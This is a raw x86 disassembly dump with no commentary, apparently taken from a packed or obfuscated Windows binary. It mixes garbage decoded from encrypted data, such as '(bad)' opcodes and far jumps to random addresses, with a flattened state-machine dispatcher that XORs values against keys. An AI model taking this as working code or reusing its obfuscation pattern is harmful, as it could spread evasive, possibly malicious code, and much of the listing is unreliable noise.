  40e13c:	xor    DWORD PTR ds:0x43386f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	mov    ds:0x72630c36,eax
  40e15f:	call   0x7e7e:0x7f127e7e
  40e166:	cmp    eax,0xb737197b
  40e16b:	ret    0x176e
  40e16e:	fcmovne st,st(4)
  40e170:	ss icebp 
  40e172:	push   edi
  40e173:	jo     0x40e1aa
  40e175:	add    esp,DWORD PTR [eax+0x14339aa6]
  40e17b:	pop    es
  40e17c:	(bad)  
  40e17d:	push   DWORD PTR [ebx+edx*2+0x19]
  40e181:	inc    edi
  40e182:	daa    
  40e183:	rol    BYTE PTR [edx],1
  40e185:	enter  0x2d6f,0x9d
  40e189:	inc    ebp
  40e18a:	in     al,dx
  40e18b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e18c:	(bad)  
  40e18e:	xor    DWORD PTR [ebx+esi*2+0x5],ecx
  40e192:	out    0xe1,eax
  40e194:	sub    al,BYTE PTR ds:0x68305892
  40e19a:	shr    DWORD PTR [edi-0x28],cl
  40e19d:	sub    al,0x41
  40e19f:	xchg   DWORD PTR cs:0x442fc735,ebx
  40e1a6:	push   edx
  40e1a7:	adc    al,0x92
  40e1a9:	push   esp
  40e1aa:	mov    dl,dl
  40e1ac:	out    dx,eax
  40e1ad:	sub    BYTE PTR [esi],0xe8
  40e1b0:	mov    WORD PTR [eax+0x59c54c90],cs
  40e1b6:	add    al,0xfd
  40e1b8:	jmp    0x19f2:0x30616bee
  40e1bf:	add    ebx,DWORD PTR [edi-0x7b4c4b11]
  40e1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1c6:	mov    ebp,0x54ae0b11
  40e1cb:	xor    bh,BYTE PTR [eax-0x35]
  40e1ce:	adc    al,0xae
  40e1d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1d1:	inc    ecx
  40e1d2:	mov    BYTE PTR [ecx],al
  40e1d4:	(bad)  
  40e1d5:	fst    QWORD PTR fs:[ecx]
  40e1d8:	retf   0x9df5
  40e1db:	pop    es
  40e1dc:	mov    bh,0xb7
  40e1de:	jecxz  0x40e1e7
  40e1e0:	clc    
  40e1e1:	inc    edx
  40e1e2:	xor    cl,dl
  40e1e4:	add    ch,BYTE PTR [edx+0x1fbad132]
  40e1ea:	rcl    BYTE PTR [edx+0x53],cl
  40e1ed:	inc    edx
  40e1ee:	and    DWORD PTR [ebp+ecx*1+0x2a],esi
  40e1f2:	imul   ebx,ebp,0xcc319dd1
  40e1f8:	xchg   edi,eax
  40e1f9:	xor    edx,DWORD PTR [edi-0x3540d145]
  40e1ff:	aas    
  40e200:	mov    al,0x1c
  40e202:	int    0x91
  40e204:	jg     0x40e242
  40e206:	mov    db2,esp
  40e209:	cmp    DWORD PTR [edx],esp
  40e20b:	sbb    al,0x7b
  40e20d:	jmp    0x40e276
  40e20f:	mov    ecx,0xaab66407
  40e214:	xor    eax,0xa36f467a
  40e219:	or     BYTE PTR [ebp+0x20ad9a13],0x75
  40e220:	out    dx,al
  40e221:	gs push cs
  40e223:	dec    eax
  40e224:	pushf  
  40e225:	call   0xece4f687
  40e22a:	lahf   
  40e22b:	dec    edi
  40e22c:	(bad)  
  40e22d:	cmp    esi,DWORD PTR [ebx]
  40e22f:	shl    ebp,0x2a
  40e232:	fild   WORD PTR [ecx]
  40e234:	aam    0xf6
  40e236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e237:	or     eax,0x8103c55a
  40e23c:	mov    esi,0x28aacb00
  40e241:	call   0x142309a8
  40e246:	es cli 
  40e248:	push   ds
  40e249:	pop    ecx
  40e24a:	xor    DWORD PTR [edx+0xf],edi
  40e24d:	mov    dl,0x32
  40e24f:	mov    ds:0xbb372f9f,eax
  40e254:	in     al,0x16
  40e256:	sub    eax,DWORD PTR [edx+ecx*2-0x2bc454fc]
  40e25d:	sti    
  40e25e:	push   ss
  40e25f:	xor    eax,0xa3d0f11b
  40e264:	xchg   ecx,eax
  40e265:	pop    esp
  40e266:	xlat   BYTE PTR ds:[ebx]
  40e267:	mov    edx,0xd7d40b0c
  40e26c:	mov    ds:0x2ac10613,al
  40e271:	loop   0x40e23e
  40e273:	ins    DWORD PTR es:[edi],dx
  40e274:	ja     0x40e21b
  40e276:	out    dx,al
  40e277:	jne    0x40e25b
  40e279:	jp     0x40e2da
  40e27b:	das    
  40e27c:	mov    ah,0x57
  40e27e:	fndisi(8087 only) 
  40e280:	ins    BYTE PTR es:[edi],dx
  40e281:	(bad)  
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43378b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433863,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4338ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433817,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43378b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433857,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43381f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43379b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43389f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4338ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43385f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43389b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433857,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4337d3,0x4337df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433827,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433853,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433857,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433783,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433783,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433817,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433783,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43382f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4338ab
  40e3da:	and    DWORD PTR ds:0x43378b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4337e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433893
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	ins    BYTE PTR es:[edi],dx
  40e415:	loope  0x40e39e
  40e417:	fs push ss
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e43b
  40e421:	or     BYTE PTR ds:0x739b4dd,al
  40e427:	and    cl,BYTE PTR [eax-0x1e]
  40e42a:	push   es
  40e42b:	stos   BYTE PTR es:[edi],al
  40e42c:	jnp    0x40e3f4
  40e42e:	pop    DWORD PTR [edx+0x279c79f6]
  40e434:	inc    ecx
  40e435:	or     bl,bl
  40e437:	xor    ebx,ebp
  40e439:	test   eax,ebp
  40e43b:	push   eax
  40e43c:	sbb    eax,0x97b1323b
  40e441:	lods   al,BYTE PTR cs:[esi]
  40e443:	clc    
  40e444:	out    dx,eax
  40e445:	jnp    0x40e47f
  40e447:	xchg   ebx,eax
  40e448:	and    DWORD PTR [ebx-0x296e421b],ebp
  40e44e:	push   ss
  40e44f:	in     eax,dx
  40e450:	(bad)  
  40e451:	dec    esp
  40e452:	xchg   ebp,eax
  40e453:	(bad)  
  40e454:	gs mov eax,es:0xb72d75cd
  40e45b:	xlat   BYTE PTR ds:[ebx]
  40e45c:	stc    
  40e45d:	ret    
  40e45e:	(bad)  
  40e45f:	outs   dx,DWORD PTR ds:[esi]
  40e460:	sbb    ebp,ecx
  40e462:	mov    eax,DWORD PTR [edx-0x35]
  40e465:	add    esp,DWORD PTR [eax-0x5f36b9ac]
  40e46b:	aas    
  40e46c:	das    
  40e46d:	or     al,0x26
  40e46f:	mov    dl,0xff
  40e471:	scas   eax,DWORD PTR es:[edi]
  40e472:	popa   
  40e473:	loope  0x40e4ec
  40e475:	dec    ebp
  40e476:	push   cs
  40e477:	adc    dl,BYTE PTR [esi]
  40e479:	mov    eax,ds:0xa4927bb7
  40e47e:	inc    esp
  40e47f:	push   DWORD PTR ds:0xc44b42d0
  40e485:	not    DWORD PTR [edx+0x2fead7b1]
  40e48b:	cmp    eax,0x37a9d0b0
  40e490:	stc    
  40e491:	add    al,0x7b
  40e493:	push   ebx
  40e494:	bound  ecx,QWORD PTR [edx-0x3d]
  40e497:	test   al,0x5c
  40e499:	imul   ebp,DWORD PTR [edi],0xffffff9c
  40e49c:	xchg   esi,ebp
  40e49e:	dec    ebp
  40e49f:	add    ah,bl
  40e4a1:	std    
  40e4a2:	xor    eax,0xf26a00d9
  40e4a7:	scas   eax,DWORD PTR es:[edi]
  40e4a8:	fs ret 
  40e4aa:	mov    ecx,0xfaf5750d
  40e4af:	shr    eax,0x8b
  40e4b2:	push   cs
  40e4b3:	aas    
  40e4b4:	cmp    edi,DWORD PTR [esi]
  40e4b6:	sbb    ebp,eax
  40e4b8:	adc    BYTE PTR [edi],ch
  40e4ba:	jne    0x40e4b6
  40e4bc:	ret    0x648a
  40e4bf:	int3   
  40e4c0:	jne    0x40e4d9
  40e4c2:	retf   
  40e4c3:	push   ebp
  40e4c4:	or     al,0x87
  40e4c6:	jb     0x40e4aa
  40e4c8:	xchg   edi,eax
  40e4c9:	enter  0xb27d,0x99
  40e4cd:	js     0x40e47b
  40e4cf:	sub    ah,BYTE PTR [ecx-0x6a418cdc]
  40e4d5:	mov    dl,0x4d
  40e4d7:	adc    ebp,DWORD PTR [esi+edi*1]
  40e4da:	xchg   DWORD PTR [edx],edx
  40e4dc:	jmp    0x35f6:0x57b672fd
  40e4e3:	retf   
  40e4e4:	push   eax
  40e4e5:	and    eax,0xc50c5559
  40e4ea:	or     esp,ecx
  40e4ec:	sar    BYTE PTR [ecx],0xe6
  40e4ef:	scas   eax,DWORD PTR es:[edi]
  40e4f0:	mov    cl,0xb6
  40e4f2:	int3   
  40e4f3:	and    DWORD PTR [ebp+0x72ab2010],eax
  40e4f9:	ret    0x760f
  40e4fc:	cmp    dh,BYTE PTR [edi-0xf8c199c]
  40e502:	jmp    0x39c6332f
  40e507:	lods   al,BYTE PTR ds:[esi]
  40e508:	mov    ecx,0xc97be335
  40e50d:	sub    al,0x3e
  40e50f:	imul   DWORD PTR [eax+0x5e]
  40e512:	repnz popf 
  40e514:	in     al,0xcd
  40e516:	jo     0x40e4e4
  40e518:	ins    BYTE PTR es:[edi],dx
  40e519:	out    0x2f,eax
  40e51b:	adc    esp,eax
  40e51d:	stos   BYTE PTR es:[edi],al
  40e51e:	js     0x40e4e4
  40e520:	jg     0x40e514
  40e522:	pop    ds
  40e523:	add    bh,BYTE PTR [ecx-0x19]
  40e526:	adc    DWORD PTR [ecx],0x6aad0517
  40e52c:	test   eax,0xed07874c
  40e531:	sbb    esp,DWORD PTR ds:0x10d2e3d6
  40e537:	dec    ecx
  40e538:	ins    BYTE PTR es:[edi],dx
  40e539:	mov    eax,ds:0x458b7199
  40e53e:	hlt    
  40e53f:	or     DWORD PTR ds:0x433823,0x43386b
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x43385b,0x43382f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xb2f261b8
  40e5b4:	jl     0x40e586
  40e5b6:	mov    esp,0x7e7e992a
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e560
  40e5c0:	cmp    al,0xcb
  40e5c2:	cmp    esp,esp
  40e5c4:	add    dl,bl
  40e5c6:	enter  0x3e41,0x2f
  40e5ca:	adc    ch,cl
  40e5cc:	xor    DWORD PTR ss:[esi+0x2498343e],ebp
  40e5d3:	imul   esi,DWORD PTR [eax+0x4e],0x45
  40e5d7:	bound  esi,QWORD PTR [edi+0x67bb7e0a]
  40e5dd:	out    dx,eax
  40e5de:	xchg   BYTE PTR [eax+0x1e],cl
  40e5e1:	int3   
  40e5e2:	mov    BYTE PTR [eax+ebp*8-0x5d0ea39a],cl
  40e5e9:	xchg   esp,eax
  40e5ea:	(bad)  
  40e5ec:	shr    DWORD PTR [eax-0x1c],0x92
  40e5f0:	out    0xe9,al
  40e5f2:	xlat   BYTE PTR ds:[ebx]
  40e5f3:	inc    esi
  40e5f4:	scas   al,BYTE PTR es:[edi]
  40e5f5:	jecxz  0x40e619
  40e5f7:	cmp    DWORD PTR [esi+0x13],ebx
  40e5fa:	add    al,0x6
  40e5fc:	addr16 loope 0x40e640
  40e5ff:	in     al,0xdb
  40e601:	pop    esi
  40e602:	stos   DWORD PTR es:[edi],eax
  40e603:	ss jbe 0x40e628
  40e606:	add    cl,0x49
  40e609:	out    0xe0,al
  40e60b:	lahf   
  40e60c:	fadd   DWORD PTR [ecx+0x1cfca771]
  40e612:	add    eax,0x5de4df09
  40e617:	loop   0x40e651
  40e619:	fmulp  st(7),st
  40e61b:	adc    BYTE PTR [edx],0x91
  40e61e:	cwde   
  40e61f:	jae    0x40e61c
  40e621:	shl    DWORD PTR [edx+0x2ab701d7],cl
  40e627:	lds    edi,FWORD PTR [edi-0x67]
  40e62a:	(bad)  [edx]
  40e62c:	or     al,0x10
  40e62e:	out    dx,al
  40e62f:	pop    ebx
  40e630:	ss stos BYTE PTR es:[edi],al
  40e632:	sti    
  40e633:	mov    ebp,0x92772f36
  40e638:	rcl    BYTE PTR [edx],1
  40e63a:	sbb    ebp,DWORD PTR [edi-0x14]
  40e63d:	lahf   
  40e63e:	test   al,0xfb
  40e640:	outs   dx,BYTE PTR ds:[esi]
  40e641:	shl    BYTE PTR [ebx],0xe2
  40e644:	mov    ds:0x37b556c8,eax
  40e649:	pop    ss
  40e64a:	dec    esi
  40e64b:	das    
  40e64c:	sub    DWORD PTR [ecx-0x60],ebp
  40e64f:	sar    DWORD PTR [ebx+0x15],1
  40e652:	push   ds
  40e653:	xchg   BYTE PTR [ebp+0x1cb07eac],bl
  40e659:	mov    esi,0xa0443db5
  40e65e:	lods   al,BYTE PTR ds:[esi]
  40e65f:	pop    edx
  40e660:	xchg   ebx,eax
  40e661:	mov    ecx,0x1b3452c7
  40e666:	sbb    al,0x33
  40e668:	sahf   
  40e669:	adc    bh,al
  40e66b:	push   ss
  40e66c:	test   ebx,edi
  40e66e:	jmp    0x4b166ba9
  40e673:	jmp    0xdedd:0xf148be53
  40e67a:	mov    al,ds:0x25c34e38
  40e67f:	ret    
  40e680:	loopne 0x40e604
  40e682:	jns    0x40e618
  40e684:	rol    DWORD PTR [edi],cl
  40e686:	mov    esp,0x6c29707b
  40e68b:	sti    
  40e68c:	ds xor al,0x7d
  40e68f:	popa   
  40e690:	push   esp
  40e691:	and    edx,DWORD PTR [ebp-0x2e96879a]
  40e697:	cmp    BYTE PTR [eax+0x59081c1b],bl
  40e69d:	sub    DWORD PTR ds:0x146c44ea,ebx
  40e6a3:	xor    ebx,DWORD PTR [esi+0x4db2a7f5]
  40e6a9:	dec    eax
  40e6aa:	cmp    al,BYTE PTR [edi-0x26bf3df1]
  40e6b0:	dec    edi
  40e6b2:	push   esi
  40e6b3:	pop    edx
  40e6b4:	loope  0x40e72b
  40e6b6:	ret    0x310b
  40e6b9:	push   edx
  40e6ba:	jmp    0x4962b9bb
  40e6bf:	repnz pop ecx
  40e6c1:	jecxz  0x40e6d9
  40e6c3:	add    cl,BYTE PTR [edi-0x3d]
  40e6c6:	mov    ch,0xa8
  40e6c8:	jb     0x40e70d
  40e6ca:	or     ch,BYTE PTR [ecx+0x1d]
  40e6cd:	(bad)  
  40e6cf:	pop    ds
  40e6d0:	jle    0x40e725
  40e6d2:	adc    eax,0xf2795e5f
  40e6d7:	(bad)  
  40e6d8:	jge    0x40e716
  40e6da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x2fec0bd9]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e686
  40e704:	push   es
  40e705:	je     0x40e6eb
  40e707:	(bad)  [ecx-0x3f477d27]
  40e70d:	(bad)  
  40e70e:	xchg   esi,eax
  40e70f:	push   edx
  40e710:	adc    BYTE PTR [esi],ah
  40e712:	jns    0x40e6ab
  40e714:	xchg   BYTE PTR [ebx+edx*8-0x19],bl
  40e718:	stos   DWORD PTR es:[edi],eax
  40e719:	sub    DWORD PTR [edi],0x41
  40e71c:	xchg   ebp,eax
  40e71d:	shl    DWORD PTR [eax],1
  40e71f:	retf   
  40e720:	idiv   al
  40e722:	pop    ecx
  40e723:	neg    BYTE PTR [ebp-0x20]
  40e726:	outs   dx,DWORD PTR ds:[esi]
  40e727:	dec    eax
  40e728:	sbb    eax,ebx
  40e72a:	stos   DWORD PTR es:[edi],eax
  40e72b:	sbb    BYTE PTR [ebx],dh
  40e72d:	stos   BYTE PTR es:[edi],al
  40e72e:	nop
  40e72f:	repz in eax,dx
  40e731:	and    eax,0xeab50a7b
  40e736:	push   ebx
  40e737:	sub    eax,0x1df7da14
  40e73c:	das    
  40e73d:	push   eax
  40e73e:	aas    
  40e73f:	pop    ss
  40e740:	test   eax,0xee83cd30
  40e745:	ja     0x40e6df
  40e747:	mov    eax,0xfee96435
  40e74c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e74d:	adc    eax,0xf3bfc720
  40e752:	outs   dx,BYTE PTR ds:[esi]
  40e753:	imul   esp,DWORD PTR [eax-0x39ff6044],0x207e9ec3
  40e75d:	pop    eax
  40e75e:	or     BYTE PTR [esi+0x41ea23e3],0xef
  40e765:	pop    eax
  40e766:	(bad)  
  40e767:	sub    dl,bl
  40e769:	pop    ebx
  40e76a:	(bad)  
  40e76b:	into   
  40e76c:	pushf  
  40e76d:	xor    eax,0xb52a3784
  40e772:	lahf   
  40e773:	mov    cl,0x18
  40e775:	or     esi,DWORD PTR [edx-0x2351885c]
  40e77b:	pop    esp
  40e77c:	ret    0x6077
  40e77f:	fst    DWORD PTR [edx]
  40e781:	pop    ebx
  40e782:	and    al,0xda
  40e784:	int    0x8c
  40e786:	mov    DWORD PTR [ebx+0x6a268869],ecx
  40e78c:	minsd  xmm2,QWORD PTR [edx+eiz*4-0x37]
  40e792:	push   esi
  40e793:	pop    eax
  40e794:	in     al,0x5
  40e796:	cmp    BYTE PTR [edx+0x19],0x94
  40e79a:	shr    DWORD PTR [ecx-0x3f],0xc5
  40e79e:	sbb    al,0xcf
  40e7a0:	cld    
  40e7a1:	das    
  40e7a2:	xor    ebp,edi
  40e7a4:	mov    bh,BYTE PTR cs:[esi-0x4233ea7d]
  40e7ab:	mov    edx,DWORD PTR [esi]
  40e7ad:	mov    edi,?
  40e7af:	inc    esi
  40e7b0:	xchg   edx,eax
  40e7b1:	lods   eax,DWORD PTR ds:[esi]
  40e7b2:	add    dl,0x25
  40e7b5:	push   esi
  40e7b6:	(bad)  
  40e7b8:	push   edi
  40e7b9:	sub    BYTE PTR [esi-0x54],dl
  40e7bc:	sub    eax,0x15ead7c
  40e7c1:	xchg   esp,eax
  40e7c2:	mov    bl,0xfd
  40e7c4:	jo     0x40e7c9
  40e7c6:	jge    0x40e7a7
  40e7c8:	(bad)  
  40e7c9:	adc    cl,bh
  40e7cb:	dec    bp
  40e7cd:	mov    esp,0x2c06dba2
  40e7d2:	fcomp  st(6)
  40e7d4:	push   cs
  40e7d5:	ja     0x40e783
  40e7d7:	outs   dx,BYTE PTR ds:[esi]
  40e7d8:	ret    
  40e7d9:	push   esi
  40e7da:	pop    edi
  40e7db:	add    eax,0xa4493b62
  40e7e0:	int    0xb7
  40e7e2:	popa   
  40e7e3:	xchg   sp,ax
  40e7e5:	jp     0x40e810
  40e7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7e8:	mov    edx,0xb3303b14
  40e7ed:	fistp  QWORD PTR [edx]
  40e7ef:	xchg   esi,eax
  40e7f0:	add    ebx,DWORD PTR [edi]
  40e7f2:	mov    DWORD PTR [ebx+ebp*1],eax
  40e7f5:	jne    0x40e7c2
  40e7f7:	and    DWORD PTR [edi],ebp
  40e7f9:	pop    ecx
  40e7fa:	test   BYTE PTR [esi],bl
  40e7fc:	jp     0x40e844
  40e7fe:	sbb    edi,edi
  40e800:	and    cl,BYTE PTR [ebp-0x5f726a7f]
  40e806:	repnz shl DWORD PTR ds:[esi+0x2],cl
  40e80b:	mov    WORD PTR [ecx+0x313eb1db],cs
  40e811:	sub    al,0xff
  40e813:	jns    0x40e7d4
  40e815:	mov    edi,0x47d5b86
  40e81a:	outs   dx,DWORD PTR ds:[esi]
  40e81b:	push   eax
  40e81c:	ins    BYTE PTR es:[edi],dx
  40e81d:	and    eax,0xfc4589b7
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e7f5
  40e854:	mov    cs,WORD PTR [edx]
  40e856:	(bad)  
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e7e8
  40e860:	push   ebp
  40e861:	fadd   DWORD PTR ss:[eax-0x35]
  40e865:	sahf   
  40e866:	stc    
  40e867:	pop    ebx
  40e868:	push   eax
  40e869:	stos   DWORD PTR es:[edi],eax
  40e86a:	adc    eax,0x5c5a7f56
  40e86f:	xlat   BYTE PTR ds:[ebx]
  40e870:	mov    dl,0x97
  40e872:	(bad)  
  40e873:	addr16 mov dl,0xb1
  40e876:	mov    cl,0xd
  40e878:	push   esi
  40e879:	jecxz  0x40e8b2
  40e87b:	ss xchg edi,eax
  40e87d:	icebp  
  40e87e:	in     al,dx
  40e87f:	xor    DWORD PTR [esi+0x63209a16],edi
  40e885:	test   al,0x50
  40e887:	test   al,0xf0
  40e889:	in     al,0x32
  40e88b:	mov    esi,0x9081f200
  40e890:	(bad)  
  40e891:	test   ebp,0xba7aee1e
  40e897:	fisubr WORD PTR [esi]
  40e899:	mov    eax,0xf2973e1a
  40e89e:	add    BYTE PTR [edx+0x1a7d6528],al
  40e8a4:	in     eax,0x69
  40e8a6:	(bad)  
  40e8a7:	loope  0x40e875
  40e8a9:	jl     0x40e8ea
  40e8ab:	dec    ebx
  40e8ac:	inc    ebp
  40e8ad:	imul   ebp,DWORD PTR [edx-0x140c5861],0x3b
  40e8b4:	xor    al,ah
  40e8b6:	and    esp,DWORD PTR [esi-0x1e7c2e81]
  40e8bc:	pop    edx
  40e8bd:	mov    esp,0x41cf3b71
  40e8c2:	mov    ds:0xf9d01d3b,eax
  40e8c7:	test   al,0x67
  40e8c9:	out    0xeb,al
  40e8cb:	mov    BYTE PTR [esi],al
  40e8cd:	sar    DWORD PTR [ebx+0x1363de36],1
  40e8d3:	cs jbe 0x40e936
  40e8d6:	sub    BYTE PTR [esi-0x6cbca268],bh
  40e8dc:	mov    esp,DWORD PTR [edi]
  40e8de:	aaa    
  40e8df:	stos   BYTE PTR es:[edi],al
  40e8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8e1:	mov    bh,0x5a
  40e8e3:	add    edx,DWORD PTR [ebx+eax*8-0x4fa4fa3a]
  40e8ea:	sub    eax,0xe616d606
  40e8ef:	es popf 
  40e8f1:	mov    edx,0x8c6b2955
  40e8f6:	pop    ecx
  40e8f7:	adc    esi,eax
  40e8f9:	cli    
  40e8fa:	mov    ch,0x93
  40e8fc:	mov    edi,0x501de232
  40e901:	cmp    al,0xdd
  40e903:	lds    eax,FWORD PTR [ebp+0x33]
  40e906:	cmp    al,0xc8
  40e908:	sub    DWORD PTR [edx+0x52],0xffffffa6
  40e90c:	mov    BYTE PTR [esi],0x4d
  40e90f:	xchg   ebx,eax
  40e910:	pop    ebp
  40e911:	pop    ds
  40e912:	cmp    al,0xd3
  40e914:	loopne 0x40e8ec
  40e916:	leave  
  40e917:	fs sti 
  40e919:	outs   dx,DWORD PTR ds:[esi]
  40e91a:	dec    edx
  40e91b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e91c:	xor    ebp,0x421acf9d
  40e922:	sbb    dh,BYTE PTR [eax]
  40e924:	loope  0x40e8b4
  40e926:	stc    
  40e927:	sahf   
  40e928:	sbb    BYTE PTR [edi+0x51],dl
  40e92b:	imul   esp,esp,0x9dc0886b
  40e931:	test   DWORD PTR [edi-0x69],esp
  40e934:	pop    edi
  40e935:	mov    edi,esp
  40e937:	leave  
  40e938:	ret    
  40e939:	sbb    BYTE PTR [ecx-0x5],cl
  40e93c:	push   0x5b
  40e93e:	add    BYTE PTR [edx+0x3f],ch
  40e941:	sahf   
  40e942:	add    eax,0x24330711
  40e947:	push   0x2e
  40e949:	std    
  40e94a:	aas    
  40e94b:	xor    al,0xba
  40e94d:	jno    0x40e949
  40e94f:	not    BYTE PTR [esi+ecx*8]
  40e952:	pop    esi
  40e953:	inc    ebx
  40e954:	fld    QWORD PTR [esi]
  40e956:	repz add al,0x0
  40e959:	or     ebp,eax
  40e95b:	push   ebx
  40e95c:	push   esp
  40e95d:	popa   
  40e95e:	jno    0x40e987
  40e960:	test   DWORD PTR [eax+0x548207da],ebp
  40e966:	pushf  
  40e967:	xor    eax,DWORD PTR [edx]
  40e969:	xchg   ebx,eax
  40e96a:	sbb    ch,dl
  40e96c:	pop    ss
  40e96d:	push   eax
  40e96e:	test   DWORD PTR [ebx+ebp*1-0x1a],0x88e37730
  40e976:	pop    ds
  40e977:	sub    ebp,DWORD PTR [ecx-0x7af0a2c5]
  40e97d:	ds stc 
